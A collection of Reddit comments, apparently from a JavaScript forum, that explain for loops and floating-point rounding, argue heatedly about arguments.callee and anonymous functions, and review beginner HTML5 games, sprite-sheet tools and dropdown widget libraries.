 for ( i = 0; i &lt;= 1; i += 0.1 ) { x = i; y = i * i; } =&gt; 0.9999999999999998 x =&gt; 0.9999999999999999 y =&gt; 0.9999999999999998 Whole numbers go in, floating point approximations come out. Can't explain that! &lt;wink&gt;
Sure, I'll start at the beginning then. Ask questions for anything you don't get, k? There are different kinds of programming languages out there. JavaScript is an "imperative" language (functional programmers reading along hush for a moment!) This means that the programmer lists a bunch of imperatives (i.e. commands) that he (or she) expects the computer to do in order. So if you run this in a Chrome: document.write("Hello"); document.write("World!"); it will print out "Hello" followed by "World!" This is different from HTML and CSS which are (mostly) declarative languages. For them you just describe the way you want things to look and work and the computer figures out what order to do stuff in. Driving directions: Imperative. A description of a painting: Declarative. Got it? Recognizing the difference will give you somewhere to start when approaching a brand new language you've never seen before. Okay, now back to JavaScript. The next thing you need to know is variables. Think of a variable as a box that you can put stuff in. In your above example, i, x and y are all variables and the code was putting numbers into them. i = 0.2; means put the number 0.2 into the variable named i and every time you see an i, pretend it's a 0.2 instead. So then after that, the line y = i * i; would mean y = 0.2 * 0.2; * is the multiplication operator in JavaScript so this would multiply 0.2 and 0.2 together to get 0.4, then assign that value to y. Now every time the computer sees a variable named y, it'll replace it with 0.4. If a new value is assigned to a variable, then the old value is forgotten so: i = 2; x = i; i = 4; document.write("i = " + i); document.write(" x = " + x); would print out "i = 4 x = 2". Make sense? Now there are all kinds of different imperatives you can write. There's an if statement that will let you tell the computer to only run a bunch of commands if some value is considered to be true. Also, there are loops which are designed to execute the same commands again and again until some condition becomes true or is no longer true. The while statement I mentioned above and your for statement are two kinds of loops. The for statement executes the first command in its brackets (in your case "i = 0". Then it checks to see if the next section (up to the semi-colon) is true. In this case, it's checking to see if i is less than or equal to 1 and it is because 0 is less than 1 (duh). If this is true (which it is), the loop will execute all of the commands within the braces { } in order. When it gets to the closing brace, it executes the third statement in the for brackets which sets i to i + 0.1. Then it checks the exit condition again. Are we still &lt;= 1? if so, it'll run the commands in the loop again, add 0.1 to i again and check again. Once the loop condition is finally false, then the next command the computer will execute is the one right after the for loop's closing brace, (if there are any more commands that is). If your loop exit condition always evaluates to true, like if you were checking 0 &lt;= 1 instead of i &lt;= 1, then your program will get stuck in an infinite loop, furiously executing the same commands again and again until you get bored and kill the program by closing your browser. Hope this helps!
This is a called a `for` loop and is a block of distinct code to tell the computer to repeat a set of operatons a number of times. A small point, but notice the introduction of the `var` keyword, this is important as to make `i` a local variable rather than global. Consider if you had two `for` loops both wanting to reference `i`, confusion would occur. (For further details look up variable scope.) Firstly to name the pieces: * `i`, `x` and `y` are all *variables*. These are elements that can have a changeable value. A variable is a reference to some piece of data, think of it as a name, and it works in very much the same way as the `x` and `y` from algebra. It means we have some data and it's name is `x`, so it allows us to change data because we can uniquely identify them. This is in contrast to the numbers: `1` and `0.1`, whose values never change. We also have the operators: * mathematical: `+` addition, `*` multiply * assignment: `=` will connect a variable with some real value, `+=` will perform an addition before assignment * comparative: `&lt;=` less than or equal to The rest of the symbols [`( ) { } ;`] help us give meaning to the program. for (var i=0; i &lt;= 1; i += 0.1 ) The conditions of the `for` loop are set here contained within the brackets `( ... )`. There are three distinct parts separate by `;`, the semi-colon: * (1) `var i=0;` states that there is some variable `i` which will be a number with the value of 0. * (2) `i &lt;= 1;` states that the `for` loop will repeat while `i` is less than `1`. This part is the logical condition to determine whether the loop contiues or stop. While true it will repeat, if `i` never changes then it will loop forever as `i` has been set to zero! * (3) `i += 0.1` states that at the end of every repetition we will take the value of `i` add it to 0.1, then assign this new number to `i`. It could have been written as `i = i + 0.1`. If we use logic and maths, we should quickly realise that the `for` loop will be likely run 10 times, because on the 11th repetition `i` would no longer be less than or equal to `1`. Next: { x = i; y = i * i; } This is the *body* of the `for` loop, and it is always enclosed with curly braces. While the condition talked about previously remain true this operations will occur. Quite simple `x` is set to the value of `i`, and `y` will be set to the value of `i` squared. So let us run through the code: * 0: Will the code every be ran? `i` is set to 0 (1), and it is true that `i` is less than or equal to 1 (2), therefore we will run the code. `x` is now set to 0; and `y` is also set to 0 (0 * 0 = 0). We have reached the end of the body of the for loop, so we need to decide what happens next. The code described above in (3) will be ran; `i` is now set to `0 + 0.1`, and we perform the check (2). `0.1` is still less than 1 so repeat. * 1: x = 0.1, y = 0.1 * 0.1 = 0.010000000000000002. Again we add 0.1 to `i`, now `i` is equal to 0.2 which is still less than 1 so repeat. * 2: x = 0.2, y = 0.2 * 0.2 = 0.04000000000000001. Again we add 0.1 to `i`, now `i` is equal to 0.3 which is still less than 1 so repeat. * 3: I hope you now see the pattern. Eventually `i` will be greater than 1 and the loop will not continue anymore. The for loop could have been written a different way: var i = 0 while (i &lt;= 1) { // while i is less than or equal to 1 please repeat the next 3 lines of code. x = i; y = i * i; i = i + 0.1; } This program behaves in the exact same way, and the values of `x`, `y` and `i` will change in the same way as your submitted example. 
 for(X; Y; Z) { // do something } This is a shorthand for a loop, a piece of code (where the "do something" comment is) that will be run a certain amount of times. X: this part is run once, before the loop begins. Here's where you'll initialize your counter variable and any other initial variables you need. Y: this is run each time through the loop and determines if the next loop should be run. If it evaluates to false, the next loop will not be run. This is where you'll provide your exit condition (i.e. run this loop x amount of times, then stop). You don't want it to keep looping forever (unless you want to warm up your laptop and spin up its fans, that is!) Z: this runs each time through the loop. This is where you typically increment your counter variable. Without a for loop, we might have to write this: var i = 0, length = 10; // initialize variables while(i&lt;length) { // this will run the loop until it evaluates to false // do something. i++; // increment the counter } Now we can write the same code with a for loop, which is a bit friendlier to write: for(var i=0, length=10; i&lt;length; i++) { // do something. } I recommend writing out console.log(i) where I have the "do something" comment and checking your JS console. You should see the numbers 0 through 9 outputted on separate lines in the console. Hope this helps!
Just FYI, you may want to check out /r/learnprogramming.
A flow chart might be useful. http://imgur.com/JOwTz
Yes, step 1 to fixing this loop is to eliminate the loop counter of: i = i + .1 All decimal values in JS are floats, and there is no way to represent .1 precisely in binary floating point format. So the system stores an approximation that's a little low, and when you add these approximations together over and over (.1 + .1 + .1...) the errors build and you get something farther and farther from what you expected. A classic JS infinite loop: for ( var i = 0; i != 1; i += .1 ) { alert(i); } Since the value will never exactly equal 1, despite your expectations, it will jump past the escape condition with values like .9999999999997 and 1.099999999999996 You can fix this loop with: for ( var i = 0; i != 10; i++ ) { alert(i/10); } So you apply the divisor inside the loop, and keep the counter using whole numbers. This causes JS to store the counter value as an integer, which lacks these rounding issues, and minimizes rounding errors by producing them as the result of a single loop operation rather than compounding them.
20 years of Moore's Law and I'm getting the exact same framerates.
Awesome, this provides a lot of insight into who I am talking to. Thank you for allowing me to move on and think nothing more of this conversation. Good luck on your first job interview. (Although if they ask you to write code, try not to use .callee(). It's forbidden by #use strict, and also deprecated, not only that but it's a good sign you've never debugged an actual real application, names are your friend)
&gt; technically right The best kind of right.
Ah, more features I can only dream about using. I wonder how many people will be using IE6 in 2014.
How soon will this be available in major browsers and Node? After finishing the video, the answer is... The spec will be shipping in 2013, and the following are already implemented (at some level): **Proxies** are supported by V8 (Chrome, Node JS) and SpiderMonkey (Firefox) **WeakMaps** are supported by V8 and SpiderMonkey **Maps** and **Sets** (not discussed in the video) are supported by V8 **Block Scoping** (*let*) supported by V8
I use chosen: http://harvesthq.github.com/chosen/
Slightly related question: When using a &lt;video&gt; tag is the video file preloading (even before it is called to play)... ? The experience OP talks about will be great but not if things start having to buffer onmouseover
Probably the ones who will be using Windows XP and 98 in 2014 &amp;#3232;\_&amp;#3232;
Looks pretty good, thanks.
&gt;**Block Scoping** (let) supported by V8 You mean SpiderMonkey.
Although correct, I feel you have missed the point of the question (I think). OP is just trying to understand what a for loop is (right?).
Unfortunately with this code you'll run into floating point weirdness, but assuming you didn't this is what those variables would look like with each iteration of the loop. Sometimes it helps to see each iteration written out. iteration 1: i = 0 x = 0 y = 0 iteration 2: i = 0.1 x = 0.1 y = 0.01 iteration 3: i = 0.2 x = 0.2 y = 0.04 iteration 4: i = 0.3 x = 0.3 y = 0.09 iteration 5: i = 0.4 x = 0.4 y = 0.16 iteration 6: i = 0.5 x = 0.5 y = 0.25 iteration 7: i = 0.6 x = 0.6 y = 0.36 iteration 8: i = 0.7 x = 0.7 y = 0.49 iteration 9: i = 0.8 x = 0.8 y = 0.64 iteration 10: i = 0.9 x = 0.9 y = 0.81 
Guys, don't explain basics here. It's a waste of time. There are books and websites which already do this. To make matters worse, they are also much better at it than your quickly written reply.
Id say this is more normal HTML games to be honest with a bit of CSS3 thrown in. Looking at the source code for Mastermind its mainly just a huge table and doesnt really use any html5 specific elements ofwhich I can see. Edit: On a side note, you can use rgb(,,) for colours in CSS to save you from converting to hex constantly.
Simon is hilarious
You are such a tool.
The code of TTT and Simon are gare one could refactor easily. but that's always good training for beginner programmers. In all three games I see a lot of repetition and mastermind suffers of poor naming in its central submit function. mastermind has a poor user interface, tapping the number multiple times is a poor design choice, mobile devices have no game at all.
That goes straight into my toolbox! You even got decent naming of the css classes, perfect :)
congrats! your skills are instantly perceived to be worth much higher than before!
Thanks! I'm hoping this gets adopted by the creative folks at my agency, because their sprites suck.
I like your style
While that is much much better, I'd suggest you stop, take a step back, before you fire off another 'genius' or 'idiot' comment, and take a LONG hard look at the code you posted. Seriously. You are making yourself look very very foolish. Next response, take your focus off of me, breathe, calm down and focus on the code and the facts. (this is what professionals do every day) (I'll give you a hint, iter.bind isn't the same as arguments.callee.caller.bind, thats just the first error) Also, you notice how making it strict mode compliant makes it a lot easier to read and reason about? These things will be important when you actually get paid to write software. (Once we get your code cleaned up and you actually understanding it, then we'll write it in python) 
you are correct on the first two (though they are differences rather than advantages, imo), however python has all of the rest. 
No. Do some doc diving, find out what arguments.callee is, and fn.caller is, and what bind() does (you are using it wrong). Get back to me.
I'd suggest you take my advice. (Both about the calming down and not focusing on me, and the doc diving) Focus on the code, focus on the docs, focus on the facts. Ok, so I am retarded. Whatever, that doesn't change how broken your code is, (and your understanding of it) Tell me what arguments.callee.caller resolves to. Tell me what bind does and why you are using it here. It is much better that you learn of your ignorance here with a stranger than in a job interview. And no, I will not duplicate broken code. 
For a challenge, you should write a Mastermind solver in JavaScript. That'd be a great educational resource.
You didn't read the docs. Try again.
Good work, you'll find reading docs an excellent skill. It'll serve you well in your professional career. Now look at bind() This has everything to do with the conversation at hand. (Notice even you couldn't understand your own code with that anonymous function. You had to have a retarded person explain it to you.) 
I don't find obsessions with truth and reality idiotic. It serves me well. (Gives me a much fatter paycheck than many of my degreed brethren.) You seem to have an obsession with insults. What does that teach you? I do have another obsession, and that is people who chose to spout off at the mouth from a place of ignorance. This is why I say just never do it. Never talk down or insult. Chances are that you are wrong. And if you are, you go from being an asshole to an epic asshole.
Put this in a .html file and open it: &lt;script type='application/javascript'&gt; (function foo(){ console.log(arguments.callee.caller); }()) &lt;/script&gt; (In case you are too lazy, it logs null) Sure you were trying to demonstrate anonymous functions, but I think you can see that using a named function made it so much clearer? And that anonymous functions served no purpose there except to make the code unreadable and slow. (arguments.callee.caller is really really slow) Still waiting on why you need .bind() for that. All I've done is state facts. All you've done is hurl insults, which does nothing for your case. It only makes you look worse. 
Ok. It appears we have to step out of programming and move to language in general. Can you point to my use of Ad Hominem? You may find 1 or 2 if you look closely. You have yet to write a comment that does not employ it.
OK I have to call troll now. You *actually* called me retarded and accused me of ad hominem in the same comment. The irony was not lost on me. Well done. You are very skilled indeed. While I should be angered, mostly I am relieved to find out that a person like that doesn't actually exist. 
It generates a *sprite sheet*, which contains several *sprites*.
I'm guessing you used firebug or something like that? It is likely that the function returned there is the function that eval'ed your code. If you try in chrome you get function (evalFunction, object, expression, isEvalOnCallFrame, {truncated} inspectedWindow.console._commandLineAPI; } } This is why is why I said put it in an html file. Seriously you need to start checking yourself before using words like noob, and nastiness in general. It only makes it worse.
Although the ostensible nomenclature is misleading, I think it's best to defer to the prevailing definition of the word.
You mean you tested the correctness of your code. To find out what the interpreter would do by....not running it? ...ok.
http://en.wikipedia.org/wiki/Sprite_%28computer_graphics%29#Sprites_by_CSS
OH, you are talking about the original code. I was talking about using firebug to prove what arguments.callee.caller does. (see the comment, when i mentioned firebug I was talking about what the browser vs console returns) 
http://en.wikipedia.org/wiki/Anonymous_function#Python
- You constantly use tables. - You constantly modify styles in javascript rather than just setting classes. - Your doctypes are XHTML. - The only HTML5 I see is an audio tag. I guess this is okay for beginners, but slapping HTML5 on something completely unrelated makes you look like a buzzword whore. Nobody wants to look like a buzzword whore.
Well I guess you and wikipedia disagree with the meaning of anonymous function. I'll stick with wikipedia. Maybe choose another word? Maybe make one up. I'm sure if you copy and paste it 4 times it'll become true.
&gt;can't invoke an **anonymous** lambda **function** Reality, wikipedia, and I all agree. You are wrong. (and none of your name calling, cussing, and crying can change that.) You see, this is why you should never emotionally invest in a discussion like this. This is why you don't condescend, don't insult. It makes it hard to admit you are wrong. If you can't admit you are wrong, you will never learn anything. (hopefully you at least learned about callee and fn.caller(), I cant tell if you ever looked up bind()) If this was just a discussion about code, and facts, you wouldn't have that problem. But no, you started with the insults from comment 1. Now you are in a corner. Babbling, frothing, and spouting general nonsense. Again, breathe, relax, focus on the facts and the code. Forget about me. If you can't do this, you will never make it as a programmer. Edit: what happens if you ever manage to get paid to write code? You think you will always agree with everything your coworkers say? What about your managers (ha). You will be unable to either learn or have your point heard.
Um, so ... Does python support anonymous functions?
I appreciate your criticism: on my best days, I have few rivals in pedantry. You are technically correct, which is said to be the best kind.
But people will be able to use Roy during the decade it takes all browsers to adopt the newer version of ECMAScript. :(
I wrote a mastermind solver in JS at https://github.com/NebuPookins/JS-Mastermind-Solver It doesn't do any error checking, so if you give it contradicting information, it'll enter into an infinite loop looking for a solution that doesn't exist.
[What a coincidence](http://www.reddit.com/r/javascript/comments/mq6ky/one_weekend_three_html5_games/c331z92)!
so...yes then?
We decided to do it in Flash instead. [This](http://mpem.dk/StarWars.html) is what we've got so far. Of course it's just a draft and the graphic should be different and more songs will be added.
These are really cool, I am going to have a go at coding Tic-Tac-Toe. Keep up the great work mate.
If you want the source code to be a great study for beginners, you should be following javascript best practices. I see globals all over. Good work though.
You're talking about browser implementations. If you look over the features being proposed, there is absolutely nothing about the DOM. That's because ECMAScript is a programming language. The DOM is not.
The library is handy, but there is nothing asynchroneous about it. Using the [continuation-passing style pattern](http://en.wikipedia.org/wiki/Continuation-passing_style) does not mean that code is executed asynchroneously. Just remove any reference that it is asynchroneous and you're fine.
A few more: - Inline event declarations - Using `setTimeout` by passing in a string instead of a function - Using `parseInt` without including the second radix argument - Using jQuery just to use its `css` function while writing out everything else in pure DOM - Inline `style` and `script` declarations, including jQuery and other scripts in head when they should be moved to the end of the `body` - Code is entirely uncommented, and is not well organized Meh, I won't recommend anyone to 'learn' from the code
re: Tables, are you arguing that their usage was improper?
A little late, but I can't stop recommending http://www.codecademy.com/
It's certainly not "HTML5," which was the main issue. This is a little religious, but I've always been told that tables are for laying out data in a tabular format, not for general layout. It's not so bad in this case, but it's not proper. Tables are an okay way to get a quick-and-dirty grid layout, but if your app is bigger or longer-lived than this, you should probably just take a couple minutes and do it with CSS.
Where is day 2?
He gave up.
He seemed pretty positive about node in day 1.
the mastermind one has terrible UI. I actually can't play it. First of all I tried pressing enter, because it said "1 2 3 4 5 to change color, enter when ready". I was ready (to start playing) so I pressed enter. That did nothing so I clicked randomly. Then I pressed 1 and got a blue ball. Thought I had it figured out, wanted a whole row of blues. I was ready (to add a second ball) so I pressed enter. A small white dot appeared. Then I realised that enter 'submitted' my row. Right, so now to get my whole row of blues, I type 12345 and press enter. Great! Now two small red dots appear. I don't know what they mean. Soldiering on, I try for a whole row of the next colour and type 1122334455 and enter. Nothing happens. Cautiously I press 1 again and realise that I'm now on the next row. I give up.
he said would write node.js code every day. He didn't say he would write *about* writing node.js every day ...
I'm not so sure about that. All of his work made proper use of tables. It's when people are using tables to structure complete websites that it becomes a problem. 
Sweet!
How is it proper when the majority of HTML is a table containing UI elements? He's just using tables to get a grid. It's not *horrible,* but it's not right. And I probably could've been clearer: by "bigger" sites, I mainly mean nested tables, which is similar to what you're getting at. I don't think I've ever seen nested tables used properly.
That all sounds good but is it HTML5? ;)
Pretty good, but you should at least tell a person that the controls are A/D and space ;) I like it; I should do something with my Sundays myself...
+1 for controls listing…GRRR! …and your collision detection seems flawed, definite clear path (very early in game) yet still I'm GO'd. Looks nice though, love the particle explosions. Upboating.
I just add control listing :) I forget to put it before release....
Looks great! But… F5 doesn’t seem to do anything, in my browser (Chrome on Mac OS).
Freezes the first time a bullet hits an object. Firefox 3.6 Ubuntu 10.10
You can't let any enemy particles touch the bottom of the screen.
The author meant that you must refresh the page to play again. Hit Cmd-R to reload in Chrome on OS X.
To the OP: you could easily bind 'r' to be "window.location = window.location" for a very cheap "restart"
Did you also do the [Paris Game Jam site](http://pierreloicdoulcet.fr/HTML5GJ//)? That is really cool.
Yes. I create this site, and I organize this Jam :)
Yes. However, the point was that this is extremely inefficient. It's slow and you're wasting everyone's time. The basics were already covered in countless books and on countless websites. **Edit:** Downvotes won't change anything. It's 1:1 vs 1:N.
muhuhu.. ship doesn't move or shoot on firefox 9
Well you said it yourself. Tables are for tabular data, not for general format. In my eyes a tic tac toe grid is a table containing x's and o's, that's tabular data. It's not like he made a nav menu with tables. Floating divs around like he did for the simon game is good, but it would be way too messy for that dot game. Also, I'm a young web developer so it's not like I spent any time using tables for layout, but I know how they've become a stigma, and have even seen tabular data made with divs because of all the hate.
Day 1 was yesterday.
It's really nice aestheticaly, but a bit unplayable, very short, very hard... It's hard to pass 20.000 points. Edit: Tested on Chrome 16, Ubunto 10.04
Nice! What algorithm are you using for the solver?
Why A/D and not arrow right and left? Makes the game shitty. Other than that great work.
No it wasn't... it was the 24^th , today is the 27^th
The particles look really nice, are you using a helper library of some kind or native canvas?
Great work :) 
You should take a look at optipng. I reduced my test image by about 18%. I have done a similar script in python: https://gist.github.com/980354 You just point it to a directory and it makes a sprite sheet with all the images in it.
Same problem, same browser. Works great in Chrome though, nice work hexapode!
On Firefox 8 the ship moves WAY to fast to accurately aim at the little particles. No way to even get to 3000 points. Another words, the first part of the first wave always ends the game. As far as game design goes, nice effects but completely unplayable. The fact that a single particle ends the game makes it suck. Only a masochist would want to play something this difficult and unforgiving. Focus less on effects and more on playability and entertainment value. For example, what if the particles, when missed, accumulated in tightly packed "piles" at the bottom of the screen (like in Tetris)? The piles could prevent your ship from being able to move past them laterally. The end condition would be your ship being hit by a falling particle (e.g. after being laterally immobilized by piles of particles), being hit by a landslide of particles that had accumulated steeply, or hitting/touching a pile of particles laterally (possibly due to causing a landslide).
Serves me right for screwing around with blogger a few days ago I suppose.
…so it seems. Donut.
Thanks for your comment. I made a similar script in php a couple of years ago, but I wanted to see what was possible in the browser.
Looks good. Playing with it now. What a fantastic homepage. Really hooks you. Definitely giving this a try!
/r/coffeescript
&gt; Firefox 3.6 There's your problem. Firefox is on version 8 now.
ctrl-U
I really like your code, very clean, super easy to read.
Yup. Look at the DOCTYPE tag for proof.
It's a really dumb algorithm that apparently works in practice: It randomly generates a guess for the answer, then it checks that the generated guess doesn't contradict any of the previously seen evidence. If it does contradict, it starts over (generating a new guess); if there's no contradiction, it presents it as a guess to the user.
man, how time flys.
High score: 14200
...or `window.location.reload()`.
proxies are probably in chromium but don't appear to be in chrome proper yet.
Well, I deleted the initial layer, then tried backing out. It asked me if I really wanted to leave and it didn't seem to like that. So now [this](http://cl.ly/1M2V1B3h2P2K093S3s03) is following me through my tabs, I can't close your tab and I cant command-Q (quit) Chrome.
Huh. I've never had that problem. That popup is the standard onbeforeunload handler returning false because your project isn't saved. What OS? Thanks for the heads up, I'll look into it. It's still very much at alpha quality. My goal is to arrive at a full release before 2012.
 Google Chrome 15.0.874.121 (Official Build 109964) OS Mac OS X WebKit 535.2 (@100034) JavaScript V8 3.5.10.24 Flash 11.1.102.55
[/r/coffeescript](http://www.reddit.com/r/coffeescript)
I have been working with dojo alot. It comes with alot more than just some pretty combo boxes. It might be worth while to check it out. * [dijit.form.ComboBox](http://dojotoolkit.org/reference-guide/dijit/form/ComboBox.html#dijit-form-combobox) * [dijit.form.FilteringSelect](http://dojotoolkit.org/reference-guide/dijit/form/FilteringSelect.html#dijit-form-filteringselect) * [dijit.form.MultiSelect](http://dojotoolkit.org/reference-guide/dijit/form/MultiSelect.html#dijit-form-multiselect) * [dojox.form.CheckedMultiSelect](http://dojotoolkit.org/reference-guide/dojox/form/CheckedMultiSelect.html#dojox-form-checkedmultiselect) There are some more examples in the tests for the different widgets.
&gt; var $guesses = $('#guesses'); I haven't seen that before, but I really like it. I'm often not using variables for jQuery selections because it becomes harder to read. But with the $ in front it becomes very easy to read.
[ʇdıɹɔsǝǝɟɟoɔ/ɹ/](http://www.reddit.com/r/coffeescript)
Great work here. Clean code, awesome final product. Props. Out of curiosity, did you use any specific resources (books, tutorials) to learn game programming in JS? Been dying to get into it for a while now, but having trouble finding great resources.
Very nice. Small suggestion: allow the user to hit enter to continue after typing a name for a new project.
Thank you. But it's really not that clean
 Read code sources, and read https://developer.mozilla.org/en/HTML/HTML5.
No just a from scrap little engine. (basicly an array and a while).
You can read the code sources. I can't publish it on Git Hub. Code is dirty and lack of comments....
No doctype?
Yep. I should put one, thanks. 
lolwat: "Your browser is missing these features or its support for them is buggy: image-rendering, Opera"
Haha, whoops :) not having a nearest neighbor setting for image-rendering that works on canvas (IE's only works on img) is a death knell for the app. Opera both doesn't have that and also has other issues I've not resolved yet. I need to fix that message :)